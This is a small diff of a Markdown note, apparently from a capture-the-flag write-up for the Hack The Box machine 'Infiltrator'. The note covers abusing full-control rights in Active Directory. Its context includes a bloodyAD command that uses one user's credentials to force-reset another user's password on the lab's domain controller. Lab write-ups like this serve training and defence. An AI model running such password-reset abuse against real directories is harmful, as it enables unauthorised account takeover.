@@ -4,7 +4,6 @@ This is also known as full control. This privilege allows the trustee to manipul
 
 ![[Pasted image 20240904201810.png]]
 
-
 ```bash
 bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos -u "d.anderson" -p '<password>' set password "e.rodriguez" 'Password123'
 ```
